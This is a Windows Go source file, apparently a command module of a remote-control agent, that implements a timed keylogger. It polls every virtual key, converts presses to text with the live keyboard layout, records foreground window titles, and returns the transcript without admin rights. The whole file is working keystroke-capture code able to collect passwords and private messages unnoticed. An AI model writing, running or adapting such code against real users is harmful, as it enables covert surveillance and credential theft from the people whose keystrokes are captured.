//go:build windows

package commands

// Timed keystroke capture (`keylog <seconds>`): polls GetAsyncKeyState for
// every virtual key, translates presses via ToUnicode with the live
// keyboard state (shift/caps/layout correct), and tags foreground-window
// switches. Duration-bounded by design (default 60s, clamp 5s..3600s):
// the capture always ends itself and returns one transcript — no
// start/stop bookkeeping, no orphaned hook, nothing left running.
// Stdlib syscall only (same pattern as input_windows.go), no hook DLL,
// no admin needed. Single session at a time (second caller gets busy).

import (
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	procGetAsyncKeyState = modUser32.NewProc("GetAsyncKeyState")
	procGetKeyboardState = modUser32.NewProc("GetKeyboardState")
	procToUnicode        = modUser32.NewProc("ToUnicode")
	procGetForeground    = modUser32.NewProc("GetForegroundWindow")
	procGetWindowText    = modUser32.NewProc("GetWindowTextW")
)

const (
	keylogMinSecs = 5
	keylogMaxSecs = 3600
	keylogDefault = 60
	keylogMaxOut  = 64 * 1024
)

var keylogMu sync.Mutex

// parseKeylogDur parses the duration arg: bare seconds ("90"), with unit
// suffix ("90s", "5m"), or empty (default). Pure: unit-tested.
func parseKeylogDur(args string) (time.Duration, error) {
	a := strings.TrimSpace(strings.ToLower(args))
	if a == "" {
		return keylogDefault * time.Second, nil
	}
	mult := time.Second
	if strings.HasSuffix(a, "ms") {
		return 0, fmt.Errorf("usage: keylog <seconds> (5-3600, e.g. keylog 90)")
	}
	if strings.HasSuffix(a, "m") {
		mult = time.Minute
		a = strings.TrimSuffix(a, "m")
	} else if strings.HasSuffix(a, "s") {
		a = strings.TrimSuffix(a, "s")
	}
	n, err := strconv.Atoi(strings.TrimSpace(a))
	if err != nil || n <= 0 {
		return 0, fmt.Errorf("usage: keylog <seconds> (5-3600, e.g. keylog 90)")
	}
	secs := n * int(mult/time.Second)
	if secs < keylogMinSecs {
		secs = keylogMinSecs
	}
	if secs > keylogMaxSecs {
		secs = keylogMaxSecs
	}
	return time.Duration(secs) * time.Second, nil
}

// keylogName falls back to [NAME] tags for non-printable virtual keys.
func keylogName(vk int) string {
	switch vk {
	case 0x08:
		return "[BACK]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x10:
		return "[SHIFT]"
	case 0x11:
		return "[CTRL]"
	case 0x12:
		return "[ALT]"
	case 0x5B, 0x5C:
		return "[WIN]"
	case 0x14:
		return "[CAPS]"
	case 0x2E:
		return "[DEL]"
	case 0x2D:
		return "[INS]"
	case 0x24:
		return "[HOME]"
	case 0x23:
		return "[END]"
	case 0x21:
		return "[PGUP]"
	case 0x22:
		return "[PGDN]"
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	case 0x90:
		return "[NUM]"
	case 0xA0, 0xA1:
		return "[SHIFT]"
	case 0xA2, 0xA3:
		return "[CTRL]"
	case 0xA4, 0xA5:
		return "[ALT]"
	}
	if vk >= 0x70 && vk <= 0x87 {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}
	return fmt.Sprintf("[VK_%02X]", vk)
}

// keylogWindow returns the foreground window title ("") on failure.
func keylogWindow() string {
	hwnd, _, _ := procGetForeground.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	n, _, _ := procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if n == 0 {
		return ""
	}
	return string(utf16.Decode(buf[:n]))
}

// keylogChar translates one virtual-key press to text via ToUnicode with
// the current keyboard state. ok=false means use keylogName instead.
func keylogChar(vk int) (string, bool) {
	var kbd [256]byte
	r1, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbd[0])))
	if r1 == 0 {
		return "", false
	}
	scan, _, _ := procMapVirtualKey.Call(uintptr(vk), mapvkVkToVsc)
	out := make([]uint16, 16)
	r, _, _ := procToUnicode.Call(uintptr(vk), scan, uintptr(unsafe.Pointer(&kbd[0])), uintptr(unsafe.Pointer(&out[0])), uintptr(len(out)), 0)
	switch {
	case r == 0:
		return "", false // no printable char (modifier, dead start, ...)
	case int64(r) == -1:
		// Dead key buffered: flush it so the next press translates cleanly.
		_, _, _ = procToUnicode.Call(uintptr(vk), scan, uintptr(unsafe.Pointer(&kbd[0])), uintptr(unsafe.Pointer(&out[0])), uintptr(len(out)), 0)
		return "", false
	case r > 16:
		return "", false
	default:
		return string(utf16.Decode(out[:r])), true
	}
}

// keylogCapture records keystrokes for dur and returns the transcript.
func keylogCapture(args string) (string, error) {
	dur, err := parseKeylogDur(args)
	if err != nil {
		return "", err
	}
	if !keylogMu.TryLock() {
		return "", fmt.Errorf("keylog already running (one capture at a time)")
	}
	defer keylogMu.Unlock()

	deadline := time.Now().Add(dur)
	var down [256]bool
	var sb strings.Builder
	keys := 0
	lastWin := ""
	sb.WriteString(fmt.Sprintf("keylog %.0fs started\n", dur.Seconds()))
	for time.Now().Before(deadline) {
		for vk := 0x08; vk <= 0xFE; vk++ {
			r1, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
			isDown := r1&0x8000 != 0
			if isDown && !down[vk] {
				down[vk] = true
				if w := keylogWindow(); w != lastWin {
					lastWin = w
					if w != "" {
						sb.WriteString("\n[Window: " + w + "]\n")
					}
				}
				if ch, ok := keylogChar(vk); ok {
					sb.WriteString(ch)
				} else {
					sb.WriteString(keylogName(vk))
				}
				keys++
				if sb.Len() > keylogMaxOut {
					sb.WriteString("\n... truncated (64KB cap)")
					goto done
				}
			} else if !isDown {
				down[vk] = false
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
done:
	sb.WriteString(fmt.Sprintf("\nkeylog done: %d keys in %.0fs\n", keys, dur.Seconds()))
	return sb.String(), nil
}